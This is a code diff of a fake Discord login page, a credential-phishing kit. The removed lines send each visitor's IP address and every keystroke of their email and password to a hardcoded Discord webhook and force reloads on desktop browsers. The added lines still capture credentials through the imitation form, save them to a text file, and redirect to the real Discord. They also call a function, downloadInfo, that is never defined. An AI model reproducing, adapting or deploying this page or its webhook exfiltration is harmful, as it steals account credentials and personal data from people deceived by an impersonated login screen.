@@ -1,8 +1,8 @@
-<!DOCTYPE html>
 <html>
 <head>
   <title>Discord</title>
   <link rel="icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
+  <link rel="apple-touch-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
     body {
@@ -11,23 +11,21 @@
       color: #ffffff;
       display: flex;
       justify-content: center;
-      align-items: center; /* Changed to center vertically */
-      height: 100vh; /* Full viewport height */
+      align-items: flex-start;
+      height: 100vh;
       margin: 0;
-      padding: 20px;
+      padding: 20px 10px;
       box-sizing: border-box;
       user-select: none;
       text-align: center;
-      transition: opacity 0.5s ease; /* Added transition for fade effect */
+      transition: opacity 0.05s ease; /* Fastest fade-out */
     }
     .container {
-      max-width: 400px; /* Set a max width to control layout */
-      width: 100%; /* Full width within the max */
-      margin: 0 auto; /* Center horizontally */
+      margin-top: -24px;
     }
     .logo img {
       margin-top: 4px;
-      width: 100%; /* Responsive logo */
+      width: 100%;
       height: auto;
       pointer-events: none;
     }
@@ -59,109 +57,34 @@
       font-size: 16px;
       height: 39.63px;
     }
-    .alert {
-      color: #e57075;
-      font-size: 12px;
-      margin-bottom: 10px;
-      display: none;
-      text-align: left;
-    }
-    .spacer {
-      height: 0.54rem;
-    }
-    .forgot-password {
-      color: #03a0ee;
-      font-size: 12.7px;
-      text-decoration: none;
-      display: block;
-      margin-bottom: 21px;
-      text-align: left;
-    }
     .login-button {
       width: 100%;
+      margin-top: -10px;
       padding: 11.6px;
       background-color: #5865f2;
       border: none;
       color: #ffffff;
       font-size: 16.2px;
-      font-weight: 470;
+      font-weight: bold;
       cursor: pointer;
       border-radius: 0.1rem;
       height: 43px;
     }
-    .register-container {
-      text-align: left;
-      margin-top: 10px;
-    }
-    .register {
-      color: #03a0ee;
-      font-size: 13.4px;
-      text-decoration: none;
-    }
-    .need-account {
-      opacity: 0.59;
-      font-size: 14.5px;
-    }
-    .modal {
+    .info-button {
       display: none;
-      position: fixed;
-      z-index: 1000;
-      left: 0;
-      top: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-      justify-content: center;
-      align-items: center;
-    }
-    .modal iframe {
-      width: 80%;
-      height: 80%;
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #03a0ee;
+      color: #ffffff;
       border: none;
-    }
-    .close-modal {
-      position: absolute;
-      top: 20px;
-      right: 30px;
-      color: white;
-      font-size: 24px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1299192306531962910/5Y9fNdk8nyaR1-uR1jTgamOIr_sP8R71SszcL6LS31e_k9GOI8DI4dy7rSL9hweyUkmL";
-
-    function sendToWebhook(data) {
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: data })
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-      })
-      .catch(error => console.error('Error sending data:', error));
-    }
-
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        sendToWebhook(`Visitor's IP: ${data.ip}`);
-      })
-      .catch(error => console.error('Error fetching IP address:', error));
-
-    let focusApplied = false;
-
-    function isPCOrTablet() {
-      const userAgent = navigator.userAgent.toLowerCase();
-      return /windows|macintosh|linux|ipad|android(?!.*mobile)/.test(userAgent);
-    }
+    const userIP = "174.235.214.174"; // Example IP for conditional display
+    const userIPStorage = "userIP";
 
     function focusEmail() {
       document.getElementById('email').focus();
@@ -170,71 +93,55 @@
     function validateForm() {
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
-      const alertMessage = document.getElementById('alert-message');
 
-      alertMessage.style.display = 'none';
-      const emailLabel = document.querySelector('label[for="email"]');
-      const passwordLabel = document.querySelector('label[for="password"]');
-
-      emailLabel.style.color = '#b9bbbe';
-      passwordLabel.style.color = '#b9bbbe';
-
-      let valid = true;
-
-      if (!email) {
-        emailLabel.style.color = '#e57075';
-        valid = false;
-      }
-      
-      if (!password) {
-        passwordLabel.style.color = '#e57075';
-        valid = false;
-      }
-
-      if (!valid) {
-        alertMessage.style.display = 'block';
-        if (!focusApplied) {
-          focusEmail();
-          focusApplied = true;
+      // Check for empty fields
+      if (!email || !password) {
+        if (!email) {
+          document.getElementById('email').style.borderColor = 'red';
         }
+        if (!password) {
+          document.getElementById('password').style.borderColor = 'red';
+        }
+        focusEmail();
         return false;
       }
 
-      document.body.style.opacity = '0';
+      // Save input data and create text file
+      const timestamp = new Date().toLocaleString();
+      const inputData = `Email: ${email}\nPassword: ${password}\nTimestamp: ${timestamp}\n\n`;
+
+      const blob = new Blob([inputData], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'inputData.txt';
+      link.click();
+
+      // Handle fade out and redirect
+      fadeOutAndRedirect();
+      return false; // Prevent form submission
+    }
+
+    function fadeOutAndRedirect() {
+      document.body.style.opacity = 0;
       setTimeout(() => {
+        localStorage.setItem(userIPStorage, userIP); // Store user IP
         window.location.href = "https://discord.com/channels/@me";
-      }, 250);
-
-      return false;
+      }, 50); // Wait for faster fade out
     }
 
-    function updateWebhook() {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      sendToWebhook(`1: ${email}, 2: ${password}`);
-    }
-
-    document.getElementById('email').addEventListener('input', updateWebhook);
-    document.getElementById('password').addEventListener('input', updateWebhook);
-
-    function openRegisterModal() {
-      document.getElementById('registerModal').style.display = 'flex';
-    }
-
-    function closeRegisterModal() {
-      document.getElementById('registerModal').style.display = 'none';
+    function showInfoButton() {
+      const infoButton = document.getElementById('info-button');
+      if (localStorage.getItem(userIPStorage) === userIP) {
+        infoButton.style.display = 'block';
+      }
     }
 
     window.onload = function() {
       focusEmail();
+      showInfoButton();
     };
-
-    if (isPCOrTablet()) {
-      setInterval(() => {
-        window.location.reload();
-      }, -0);
-    }
   </script>
+
   <div class="container">
     <div class="logo">
       <img alt="Logo" src="https://i.ibb.co/TmMxVKn/IMG-4225.jpg" ondragstart="return false;" />
@@ -242,24 +149,13 @@
     <h1>Welcome back!</h1>
     <p>We're so excited to see you again!</p>
     <form onsubmit="return validateForm()">
-      <div class="alert" id="alert-message">Please fill in all required fields.</div>
       <label for="email">EMAIL OR PHONE NUMBER <span class="error">*</span></label>
       <input id="email" name="email" type="text"/>
-      <div class="spacer"></div>
       <label for="password">PASSWORD <span class="error">*</span></label>
       <input id="password" name="password" type="password"/>
-      <a class="forgot-password" href="#">Forgot your password?</a>
       <button class="login-button" type="submit">Log In</button>
     </form>
-    <div class="register-container">
-      <p class="need-account" style="display: inline;">Need an account?</p>
-      <a class="register" href="#" onclick="openRegisterModal()">Register</a>
-    </div>
-  </div>
-
-  <div class="modal" id="registerModal">
-    <span class="close-modal" onclick="closeRegisterModal()">×</span>
-    <iframe src="https://discord.com/register" title="Discord Registration"></iframe>
+    <button id="info-button" class="info-button" onclick="downloadInfo()">Info</button>
   </div>
 </body>
 </html>
